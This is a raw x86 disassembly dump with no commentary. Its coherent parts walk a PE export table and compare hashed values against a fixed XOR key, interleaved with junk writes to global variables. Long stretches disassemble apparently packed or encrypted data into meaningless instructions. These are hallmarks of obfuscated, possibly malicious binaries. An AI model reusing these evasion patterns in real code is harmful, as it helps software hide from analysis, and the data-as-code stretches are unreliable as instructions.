  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4337eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4337eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4337eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4337eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4337eb
  40c4ce:	and    esi,DWORD PTR ds:0x4337ef
  40c4d4:	mov    DWORD PTR ds:0x4337eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4337bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433783,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43376f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4337fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4337eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4337f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x1e2c5658
  40c577:	inc    eax
  40c578:	fwait
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	fist   WORD PTR [edi]
  40c583:	xchg   esi,eax
  40c584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c585:	mov    ebp,0x5e675b9d
  40c58a:	mov    bh,0xc
  40c58c:	xchg   BYTE PTR [edi-0x6f1d970c],bh
  40c592:	dec    ebp
  40c593:	cmp    al,0xf1
  40c595:	addr16 mov ds:0x362a,eax
  40c599:	mov    esp,0x58994c72
  40c59e:	out    dx,al
  40c59f:	mov    bh,dh
  40c5a1:	fnstsw WORD PTR [ecx]
  40c5a3:	jne    0x40c60b
  40c5a5:	imul   edx,DWORD PTR [esp+esi*2],0x6dc9bedc
  40c5ac:	je     0x40c5c7
  40c5ae:	jecxz  0x40c604
  40c5b0:	(bad)  
  40c5b1:	jae    0x40c602
  40c5b3:	push   edi
  40c5b4:	fiadd  DWORD PTR [ebp+0x482d9165]
  40c5ba:	stc    
  40c5bb:	or     DWORD PTR [esi-0x3d],edx
  40c5be:	xchg   edi,eax
  40c5bf:	loop   0x40c614
  40c5c1:	pusha  
  40c5c2:	stos   BYTE PTR es:[edi],al
  40c5c3:	stos   DWORD PTR es:[edi],eax
  40c5c4:	xchg   edi,eax
  40c5c5:	cmp    edi,DWORD PTR [edi+0x321a39c0]
  40c5cb:	dec    esp
  40c5cc:	call   0xeeab21bb
  40c5d1:	push   esp
  40c5d2:	cli    
  40c5d3:	je     0x40c5f9
  40c5d5:	sbb    BYTE PTR [ecx-0x6ee151d1],ah
  40c5db:	ds js  0x40c608
  40c5de:	add    BYTE PTR [esi],ch
  40c5e0:	into   
  40c5e1:	push   0xffffffef
  40c5e3:	xchg   esp,eax
  40c5e4:	aas    
  40c5e5:	sbb    ebx,esi
  40c5e7:	int3   
  40c5e8:	or     DWORD PTR [edx+0x7c],ecx
  40c5eb:	mov    al,ds:0xc8d38bc6
  40c5f0:	add    BYTE PTR [eax],dh
  40c5f2:	cmp    BYTE PTR [edi],dl
  40c5f4:	repz arpl WORD PTR ds:[edx-0x719f0174],sp
  40c5fc:	xchg   edx,eax
  40c5fd:	call   0x64643df
  40c602:	pop    ecx
  40c603:	pop    ecx
  40c604:	(bad)  
  40c605:	cdq    
  40c606:	push   edx
  40c607:	cmp    ch,BYTE PTR [eax+edi*8+0x7483ec9e]
  40c60e:	dec    ebx
  40c60f:	adc    eax,0xdf5869b4
  40c614:	cmc    
  40c615:	out    dx,al
  40c616:	pusha  
  40c617:	sti    
  40c618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c619:	imul   ecx,DWORD PTR [esi],0x27ea9b02
  40c61f:	pop    ecx
  40c620:	imul   eax,ebp,0x6ec0a92f
  40c626:	in     eax,0x58
  40c628:	lods   eax,DWORD PTR ds:[esi]
  40c629:	out    dx,eax
  40c62a:	sbb    al,0x3a
  40c62c:	fnstenv [ebp+0xe]
  40c62f:	adc    bh,BYTE PTR [eax-0x7b521eea]
  40c635:	lods   eax,DWORD PTR ds:[esi]
  40c636:	adc    al,0xc7
  40c638:	ffree  st(5)
  40c63a:	jb     0x40c5ce
  40c63c:	lahf   
  40c63d:	jno    0x40c60c
  40c63f:	mov    ebp,0x22e16220
  40c644:	cmp    BYTE PTR [ebp-0x51],0xa9
  40c648:	nop
  40c649:	fimul  WORD PTR [di-0x329a]
  40c64e:	mov    al,cl
  40c650:	push   cs
  40c651:	out    dx,eax
  40c652:	rcl    BYTE PTR [eax],0x89
  40c655:	imul   esp,DWORD PTR [eax+0x4f],0x46
  40c659:	fist   WORD PTR [edx-0x67]
  40c65c:	lock jmp 0xdcb2:0x1dfc3aac
  40c664:	mov    ebx,0xa0386b1e
  40c669:	add    dh,dl
  40c66b:	dec    ecx
  40c66c:	(bad)  
  40c66d:	icebp  
  40c66e:	adc    DWORD PTR [eax+edi*4-0x5eadf78e],esp
  40c675:	mov    cl,0x74
  40c677:	and    edx,DWORD PTR [ecx+0x721c5fa7]
  40c67d:	pop    ebp
  40c67e:	iret   
  40c67f:	es mov ebp,0x5db0ed7e
  40c685:	adc    BYTE PTR [eax-0x77],bl
  40c688:	hlt    
  40c689:	sub    cl,dh
  40c68b:	sub    eax,0x5917108c
  40c690:	call   0x3f0bcd12
  40c695:	ror    DWORD PTR ds:0x33edc487,cl
  40c69b:	test   al,0x67
  40c69d:	xor    eax,0x3d125bec
  40c6a2:	sub    al,0x4c
  40c6a4:	adc    esi,ecx
  40c6a6:	cmp    eax,0x22513bbc
  40c6ab:	cdq    
  40c6ac:	and    ch,BYTE PTR [ecx+0x71]
  40c6af:	stc    
  40c6b0:	sub    eax,0xf79c0494
  40c6b5:	js     0x40c672
  40c6b7:	and    dh,bl
  40c6b9:	out    0xbf,al
  40c6bb:	sbb    al,0x20
  40c6bd:	sbb    eax,0xc9a78907
  40c6c2:	cmp    BYTE PTR [eax-0x5ddddc6e],0x57
  40c6c9:	pop    edi
  40c6ca:	cmp    dl,bl
  40c6cc:	aam    0x54
  40c6ce:	ficomp WORD PTR [ebp+0x7e14b34e]
  40c6d4:	inc    edi
  40c6d5:	cdq    
  40c6d6:	mov    eax,ds:0xf5cee0a7
  40c6db:	mov    esp,0x4e50595f
  40c6e0:	int3   
  40c6e1:	pop    ecx
  40c6e2:	add    ebx,ebp
  40c6e4:	add    ah,cl
  40c6e6:	les    esp,FWORD PTR [edi]
  40c6e8:	fs std 
  40c6ea:	push   ecx
  40c6eb:	test   BYTE PTR [eax+0x7102cc8a],dl
  40c6f1:	lds    ebp,FWORD PTR [eax-0x8f78f78]
  40c6f7:	pop    es
  40c6f8:	jmp    ecx
  40c6fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6fb:	xchg   edi,eax
  40c6fc:	mov    ch,dh
  40c6fe:	cld    
  40c6ff:	lods   al,BYTE PTR ds:[esi]
  40c700:	xor    ch,BYTE PTR ds:0xd06f874d
  40c706:	cmp    al,0x37
  40c708:	call   0x1ce5:0x9eb1e7f5
  40c70f:	cld    
  40c710:	jmp    0xc392e997
  40c715:	hlt    
  40c716:	cwde   
  40c717:	dec    esi
  40c718:	ret    0x3bbb
  40c71b:	dec    esi
  40c71c:	jnp    0x40c753
  40c71e:	or     al,0x25
  40c720:	iret   
  40c721:	jne    0x40c726
  40c723:	leave  
  40c724:	(bad)  
  40c725:	out    0x63,eax
  40c727:	mov    al,ds:0x6e0ae764
  40c72c:	fnstenv [edi-0x45]
  40c72f:	or     ecx,ebp
  40c731:	retf   0x429f
  40c734:	cli    
  40c735:	vminss xmm4,xmm3,xmm7
  40c739:	sbb    al,0x67
  40c73b:	adc    ebx,DWORD PTR [edi+ecx*1-0x5104109f]
  40c742:	pop    es
  40c743:	scas   al,BYTE PTR es:[edi]
  40c744:	xchg   ebp,edi
  40c746:	hlt    
  40c747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c748:	sar    DWORD PTR [edx-0x6ade7b06],0x32
  40c74f:	jmp    0x40c73b
  40c751:	ins    DWORD PTR es:[edi],dx
  40c752:	sbb    al,0x9a
  40c754:	mov    bl,0x14
  40c756:	push   ss
  40c757:	add    ecx,DWORD PTR [ebp-0x429209ac]
  40c75d:	scas   al,BYTE PTR es:[edi]
  40c75e:	int3   
  40c75f:	adc    DWORD PTR [eax],ecx
  40c761:	xchg   DWORD PTR [ebx+0x7f],ebx
  40c764:	test   BYTE PTR [ebx-0x14],bh
  40c767:	add    eax,0x65f5d861
  40c76c:	mov    ebx,0x4e85cdaf
  40c771:	into   
  40c772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c773:	scas   eax,DWORD PTR es:[edi]
  40c774:	inc    ebx
  40c775:	sbb    dl,al
  40c777:	or     al,0xbe
  40c779:	pop    edx
  40c77a:	mov    bh,0xa1
  40c77c:	cmp    BYTE PTR [eax],ch
  40c77e:	jge    0x40c746
  40c780:	test   al,0x3
  40c782:	adc    DWORD PTR [edi],0x9897011e
  40c788:	les    ecx,FWORD PTR [edx-0x71fa15f3]
  40c78e:	lods   eax,DWORD PTR ds:[esi]
  40c78f:	adc    BYTE PTR [edx],0xbf
  40c792:	jno    0x40c728
  40c794:	dec    eax
  40c795:	pop    ds
  40c796:	mov    ebx,0x200ae57a
  40c79b:	out    0x9f,al
  40c79d:	inc    ecx
  40c79e:	adc    eax,0x6223ff73
  40c7a3:	jmp    0x4f6d:0x25775546
  40c7aa:	repz dec edx
  40c7ac:	fbstp  TBYTE PTR [ecx]
  40c7ae:	cld    
  40c7af:	cmp    DWORD PTR [ebp-0x29b38a04],edx
  40c7b5:	data16 out dx,al
  40c7b7:	dec    edi
  40c7b8:	repz leave 
  40c7ba:	xchg   eax,esi
  40c7bc:	outs   dx,BYTE PTR ds:[esi]
  40c7bd:	out    dx,eax
  40c7be:	(bad)
  40c7c2:	sbb    ebx,DWORD PTR [ecx+edx*2+0x39]
  40c7c6:	xor    BYTE PTR [edx-0x5ffd1114],ch
  40c7cc:	(bad)  [eax-0x546c67b0]
  40c7d2:	fs push ss
  40c7d4:	repz retf 
  40c7d6:	xchg   ebx,eax
  40c7d7:	add    ah,bl
  40c7d9:	int3   
  40c7da:	sbb    BYTE PTR [eax-0x50],bh
  40c7dd:	scas   al,BYTE PTR es:[edi]
  40c7de:	jmp    0xb22a3af3
  40c7e3:	dec    ebp
  40c7e4:	jno    0x40c7a9
  40c7e6:	mov    ah,0x9f
  40c7e8:	and    dh,dl
  40c7ea:	(bad)  
  40c7eb:	div    BYTE PTR [edx-0x43f7fecc]
  40c7f1:	nop
  40c7f2:	sbb    esp,DWORD PTR [esi]
  40c7f4:	lahf   
  40c7f5:	push   ebx
  40c7f6:	ret    0x8ef
  40c7f9:	dec    eax
  40c7fa:	adc    eax,0xca7c12b0
  40c7ff:	cmp    al,BYTE PTR [edi]
  40c801:	(bad)  
  40c802:	lahf   
  40c803:	or     cl,BYTE PTR [esi-0xe]
  40c806:	mov    BYTE PTR [esi+0x72],cl
  40c809:	jmp    0x4781e54c
  40c80e:	fdivr  QWORD PTR [ecx]
  40c810:	xor    dh,dh
  40c812:	sub    al,0xca
  40c814:	xor    al,0x96
  40c816:	inc    ecx
  40c817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c818:	imul   esp,DWORD PTR [esi-0x6e],0x22b7214a
  40c81f:	int3   
  40c820:	inc    ecx
  40c821:	mov    al,0x29
  40c823:	mov    eax,DWORD PTR [edx+edi*8]
  40c826:	out    0xf9,eax
  40c828:	(bad)  
  40c829:	popf   
  40c82a:	push   0x177017ab
  40c82f:	lock (bad) 
  40c831:	pcmpeqw mm2,QWORD PTR [ebx]
  40c834:	mov    ah,0xf2
  40c836:	in     eax,0xdb
  40c838:	sahf   
  40c839:	pop    edi
  40c83a:	paddb  mm3,QWORD PTR [edx+0x5]
  40c83e:	shl    ch,0xfb
  40c841:	add    edx,DWORD PTR [edi]
  40c843:	mov    edx,0x447d7a68
  40c848:	mov    ecx,0xaed93908
  40c84d:	outs   dx,BYTE PTR ds:[esi]
  40c84e:	std    
  40c84f:	div    BYTE PTR [ecx+0x2778abc]
  40c855:	lods   al,BYTE PTR ds:[esi]
  40c856:	cmp    bl,BYTE PTR [eax+0x29361ac3]
  40c85c:	push   eax
  40c85d:	test   BYTE PTR [eax+0x7a],dh
  40c860:	xchg   edi,eax
  40c861:	sbb    al,0xb1
  40c863:	pop    esp
  40c864:	loopne 0x40c85a
  40c866:	cld    
  40c867:	cmp    esi,esp
  40c869:	xchg   ebp,eax
  40c86a:	jne    0x40c895
  40c86c:	add    cl,0x5d
  40c86f:	int3   
  40c870:	ins    DWORD PTR es:[edi],dx
  40c871:	(bad)
  40c874:	xchg   BYTE PTR [edi],al
  40c876:	mov    DWORD PTR [ebx+0x1acfe7f8],edx
  40c87c:	pusha  
  40c87d:	mov    cl,0x40
  40c87f:	adc    BYTE PTR [esi+0x3b],0xa0
  40c883:	ror    DWORD PTR [ebx+0x4d8bec45],cl
  40c889:	or     BYTE PTR [ebx],al
  40c88b:	dec    eax
  40c88c:	sbb    al,0x33
  40c88e:	test   BYTE PTR [ecx+0x458bec4d],0xd8
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	int    0x66
  40c8b4:	push   ss
  40c8b5:	fsub   QWORD PTR [edi]
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	fadd   st,st(1)
  40c8c0:	stos   DWORD PTR es:[edi],eax
  40c8c1:	mov    bh,0x1e
  40c8c3:	cmp    ecx,DWORD PTR [edx+0x1b]
  40c8c6:	jb     0x40c927
  40c8c8:	jmp    0x40c8e5
  40c8ca:	pop    esp
  40c8cb:	inc    edi
  40c8cc:	add    BYTE PTR [ecx-0x4e7a48e8],ah
  40c8d2:	mov    cl,0x79
  40c8d4:	xor    BYTE PTR [eax-0x3307762e],ch
  40c8da:	xlat   BYTE PTR ds:[ebx]
  40c8db:	repz div DWORD PTR [ebx]
  40c8de:	sub    al,0x60
  40c8e0:	jp     0x40c8ed
  40c8e2:	inc    esi
  40c8e3:	mov    DWORD PTR [eax],edx
  40c8e5:	mov    ah,0xcc
  40c8e7:	ror    DWORD PTR [eax],0x2b
  40c8ea:	jns    0x40c918
  40c8ec:	mov    al,0x81
  40c8ee:	sti    
  40c8ef:	mov    esi,0x15fdbe19
  40c8f4:	jne    0x40c8c9
  40c8f6:	ret    
  40c8f7:	jmp    0x79bdf39b
  40c8fc:	dec    ebp
  40c8fd:	into   
  40c8fe:	(bad)  
  40c8ff:	jecxz  0x40c937
  40c901:	sub    dl,0x17
  40c904:	jo     0x40c8b3
  40c906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c907:	fcom   st(5)
  40c909:	mov    edi,0x10a1e035
  40c90e:	fbld   TBYTE PTR [ebx-0x641df72a]
  40c914:	stc    
  40c915:	jmp    0x40c8f7
  40c917:	pop    esi
  40c918:	fidiv  DWORD PTR [edx+0x6c]
  40c91b:	jnp    0x40c8c6
  40c91d:	xchg   BYTE PTR [edi*8-0x44cdd70a],dh
  40c924:	xchg   dh,cl
  40c926:	ret    0x2caf
  40c929:	jns    0x40c8ba
  40c92b:	outs   dx,BYTE PTR ds:[esi]
  40c92c:	sbb    al,0xf5
  40c92e:	hlt    
  40c92f:	push   ebp
  40c930:	outs   dx,DWORD PTR ds:[esi]
  40c931:	int    0xc6
  40c933:	pop    ecx
  40c934:	jnp    0x40c960
  40c936:	loop   0x40c93c
  40c938:	jne    0x40c98c
  40c93a:	or     BYTE PTR [ecx+eax*2],ch
  40c93d:	jl     0x40c8e2
  40c93f:	mov    ds:0xf1fc027e,al
  40c944:	dec    ecx
  40c945:	aad    0x55
  40c947:	add    eax,0x75217627
  40c94c:	jno    0x40c98b
  40c94e:	repnz push edi
  40c950:	shl    bl,1
  40c952:	stc    
  40c953:	div    BYTE PTR [eax-0x37139a57]
  40c959:	add    edx,DWORD PTR [eax]
  40c95b:	sub    DWORD PTR ss:[ecx],ecx
  40c95e:	lods   eax,DWORD PTR ds:[esi]
  40c95f:	rcl    DWORD PTR [eax],1
  40c961:	into   
  40c962:	jmp    FWORD PTR [edi]
  40c964:	mov    ebp,0x68ed03b0
  40c969:	adc    eax,edx
  40c96b:	in     eax,dx
  40c96c:	pop    esi
  40c96d:	and    eax,0x69bf0b1e
  40c972:	mov    al,ds:0x2f9a6e2
  40c977:	adc    eax,0xf1460cb7
  40c97c:	std    
  40c97d:	out    0xb0,al
  40c97f:	cmp    eax,0x349bff4d
  40c984:	out    0x1d,al
  40c986:	pop    ss
  40c987:	test   BYTE PTR ds:0xe16458d,dh
  40c98d:	out    dx,al
  40c98e:	scas   eax,DWORD PTR es:[edi]
  40c98f:	cmp    ch,BYTE PTR [edi-0xb]
  40c992:	xor    eax,0x6505eaff
  40c997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c998:	mov    al,0x29
  40c99a:	loopne 0x40c93e
  40c99c:	into   
  40c99d:	mov    cl,0x34
  40c99f:	shr    cl,1
  40c9a1:	imul   esp,DWORD PTR [eax+0x4f],0xb9e75398
  40c9a8:	mov    al,ah
  40c9aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ab:	jo     0x40c9f7
  40c9ad:	dec    eax
  40c9ae:	aad    0xc5
  40c9b0:	jmp    0xed9f:0x5cbec44b
  40c9b7:	or     eax,0x10eb432b
  40c9bc:	fdivr  QWORD PTR [eax]
  40c9be:	mov    ecx,0xae741320
  40c9c3:	fwait
  40c9c4:	into   
  40c9c5:	xor    dh,bh
  40c9c7:	pop    ebp
  40c9c8:	das    
  40c9c9:	sahf   
  40c9ca:	jg     0x40c979
  40c9cc:	xor    dh,bh
  40c9ce:	(bad)  
  40c9cf:	lods   al,BYTE PTR ds:[esi]
  40c9d0:	mov    cl,0x84
  40c9d2:	shl    DWORD PTR ds:0x1262513,1
  40c9d8:	fcmovnb st,st(0)
  40c9da:	and    al,0x4a
  40c9dc:	xor    al,BYTE PTR [edi]
  40c9de:	mov    fs,WORD PTR [esi]
  40c9e0:	sub    ch,al
  40c9e2:	les    esi,FWORD PTR [ecx-0x57]
  40c9e5:	jno    0x40c9c6
  40c9e7:	mov    al,0x28
  40c9e9:	add    DWORD PTR [edx],eax
  40c9eb:	imul   eax,DWORD PTR [ebx-0x7f],0x33
  40c9ef:	test   al,0xaa
  40c9f1:	xchg   eax,ebp
  40c9f3:	pop    edx
  40c9f4:	aaa    
  40c9f5:	add    ebx,DWORD PTR [edx]
  40c9f7:	(bad)  
  40c9f9:	fdivr  DWORD PTR [ecx+0x26802b18]
  40c9ff:	in     al,0x8c
  40ca01:	sub    eax,0xe8de6569
  40ca06:	cmp    eax,0xb7b1da7d
  40ca0c:	inc    ecx
  40ca0d:	aas    
  40ca0e:	push   ebp
  40ca0f:	mov    esi,0x3a4d9a87
  40ca14:	add    dl,0x50
  40ca17:	sbb    DWORD PTR [edx-0xb],0xffffff96
  40ca1b:	sbb    BYTE PTR [ecx-0x38],0x6e
  40ca1f:	(bad)
  40ca22:	outs   dx,DWORD PTR ds:[esi]
  40ca23:	ret    
  40ca24:	es push edx
  40ca26:	push   edx
  40ca27:	ja     0x40c9f2
  40ca29:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40ca2b:	nop
  40ca2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca2d:	cmc    
  40ca2e:	(bad)  
  40ca2f:	jmp    0x1735ba14
  40ca34:	xor    eax,0xccaa67e8
  40ca39:	jecxz  0x40ca49
  40ca3b:	inc    eax
  40ca3c:	mov    DWORD PTR [eax-0x5ba85a83],esp
  40ca42:	push   ds
  40ca43:	cmp    al,0x9f
  40ca45:	dec    edx
  40ca46:	xlat   BYTE PTR ds:[ebx]
  40ca47:	pop    edx
  40ca48:	or     eax,0x9a893319
  40ca4d:	cmc    
  40ca4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca4f:	loop   0x40ca7e
  40ca51:	lods   al,BYTE PTR ds:[esi]
  40ca52:	fs loop 0x40ca84
  40ca55:	dec    edx
  40ca56:	xor    eax,DWORD PTR [ebx+0x12]
  40ca59:	add    DWORD PTR [eax+0x2960b786],esp
  40ca5f:	cmc    
  40ca60:	mov    ebx,gs
  40ca62:	jns    0x40c9eb
  40ca64:	mov    WORD PTR cs:[ebx],gs
  40ca67:	jne    0x40ca4e
  40ca69:	mov    DWORD PTR [ebp+0x145fef00],edx
  40ca6f:	and    esp,DWORD PTR [edi-0x20]
  40ca72:	imul   esi,DWORD PTR [ecx-0x16e531f2],0x3
  40ca79:	mov    eax,0x1ad1ecb7
  40ca7e:	bound  ebp,QWORD PTR [edi+eax*8]
  40ca81:	inc    ebp
  40ca82:	out    dx,al
  40ca83:	fiadd  WORD PTR [ebx+0x15d8a870]
  40ca89:	pusha  
  40ca8a:	enter  0x8fcb,0x56
  40ca8e:	loopne 0x40cab8
  40ca90:	and    DWORD PTR [ebx-0x6c3ad8c4],ebx
  40ca96:	fild   WORD PTR [ebx]
  40ca98:	enter  0x4d3b,0x6c
  40ca9c:	cmp    cl,0x8a
  40ca9f:	mov    ebp,edi
  40caa1:	fadd   DWORD PTR [edx]
  40caa3:	xchg   esp,ebx
  40caa5:	jecxz  0x40cb08
  40caa7:	mov    dh,0x81
  40caa9:	inc    esi
  40caaa:	daa    
  40caab:	call   0x43b5fb97
  40cab0:	inc    ebp
  40cab1:	xchg   edx,eax
  40cab2:	cli    
  40cab3:	fist   WORD PTR [edi]
  40cab5:	jne    0x40cb2d
  40cab7:	ret    0xec67
  40caba:	jecxz  0x40ca57
  40cabc:	retf   
  40cabd:	xor    ah,BYTE PTR [esi+ecx*1]
  40cac0:	not    ecx
  40cac2:	jbe    0x40cb0a
  40cac4:	out    dx,eax
  40cac5:	ds and eax,0xd024c997
  40cacb:	inc    eax
  40cacc:	or     BYTE PTR [ebp-0x5f],dl
  40cacf:	or     BYTE PTR [edx],al
  40cad1:	clc    
  40cad2:	out    dx,eax
  40cad3:	mov    al,ds:0x8b566c93
  40cad8:	loop   0x40ca9d
  40cada:	pop    es
  40cadb:	or     DWORD PTR [esi-0x6d16ee17],edi
  40cae1:	lock and DWORD PTR [edx-0x23734889],0xffffffe1
  40cae9:	xor    bl,BYTE PTR [ebp+0x5b]
  40caec:	lock sbb ecx,DWORD PTR [ebx-0x44cb1422]
  40caf3:	ror    BYTE PTR [edi+esi*4-0x398482b7],1
  40cafa:	or     eax,0x3f80e691
  40caff:	and    ecx,esi
  40cb01:	popa   
  40cb02:	in     eax,0x51
  40cb04:	xor    ebp,ebx
  40cb06:	jmp    0xbcd3ba9
  40cb0b:	xor    al,0xda
  40cb0d:	daa    
  40cb0e:	repnz or DWORD PTR ds:0x36059605,esp
  40cb15:	ret    0x8ef1
  40cb18:	mov    eax,DWORD PTR [ebp-0xc]
  40cb1b:	jmp    0xcdafac74
  40cb20:	dec    ecx
  40cb21:	fdivr  DWORD PTR [eax+0x4ecd32b6]
  40cb27:	out    0xad,al
  40cb29:	sub    eax,0xee619f22
  40cb2e:	lahf   
  40cb2f:	push   0x24
  40cb31:	ss retf 
  40cb33:	stos   DWORD PTR es:[edi],eax
  40cb34:	test   eax,0x93481f7c
  40cb39:	adc    al,0xa8
  40cb3b:	and    BYTE PTR [esi],bh
  40cb3d:	mov    al,0xc
  40cb3f:	rol    BYTE PTR [ebp+0x65],0xee
  40cb43:	cdq    
  40cb44:	call   0xace561ad
  40cb49:	enter  0xf55,0xe3
  40cb4d:	cdq    
  40cb4e:	adc    ah,BYTE PTR [edx-0x5eb9dca2]
  40cb54:	popa   
  40cb55:	jmp    esp
  40cb57:	ret    
  40cb58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb59:	lods   al,BYTE PTR ds:[esi]
  40cb5a:	(bad)  
  40cb5b:	xor    al,0xc1
  40cb5d:	ds xchg bl,ah
  40cb60:	fisttp DWORD PTR [esi]
  40cb62:	clc    
  40cb63:	jg     0x40cbd3
  40cb65:	loopne 0x40cb9d
  40cb67:	jge    0x40cb44
  40cb69:	and    al,0xc0
  40cb6b:	jmp    0x1c0b:0x861e25ca
  40cb72:	or     eax,0xdf36e196
  40cb77:	pop    edx
  40cb78:	or     BYTE PTR [esi+0x5bb4e46a],ch
  40cb7e:	loope  0x40cb79
  40cb80:	sub    al,0x49
  40cb82:	sbb    ch,al
  40cb84:	pushf  
  40cb85:	ret    
  40cb86:	jmp    0x40cb0e
  40cb88:	mov    bh,cl
  40cb8a:	pop    ecx
  40cb8b:	(bad)  
  40cb8c:	mov    esp,0xfb328189
  40cb91:	aas    
  40cb92:	test   BYTE PTR [edi],dh
  40cb94:	imul   esi,DWORD PTR [ecx-0x2b1f8c04],0xca0e5b26
  40cb9e:	xchg   cl,ch
  40cba0:	dec    ebp
  40cba1:	sbb    al,0x96
  40cba3:	xchg   edx,edx
  40cba5:	pop    esi
  40cba6:	sub    al,0x7
  40cba8:	push   edi
  40cba9:	mov    dh,0x94
  40cbab:	repz cmp eax,0xa2d1c9ba
  40cbb1:	pop    ds
  40cbb2:	mov    ds:0x95cbe11f,al
  40cbb7:	push   es
  40cbb8:	aad    0x2
  40cbba:	mov    bh,BYTE PTR [esi+0x7b48092f]
  40cbc0:	dec    edi
  40cbc1:	push   eax
  40cbc2:	push   DWORD PTR [ebp-0x30]
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x1084e0b6
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	imul   esi,DWORD PTR [ebp-0x52b8ff5e],0x7f2027aa
  40cc58:	dec    esi
  40cc59:	test   BYTE PTR [ebx-0x21],ah
  40cc5c:	and    BYTE PTR [edi-0x20],ch
  40cc5f:	mov    ebx,0x7f96b9ad
  40cc64:	sbb    DWORD PTR [eax],0x6eace881
  40cc6a:	std    
  40cc6b:	fwait
  40cc6c:	popf   
  40cc6d:	std    
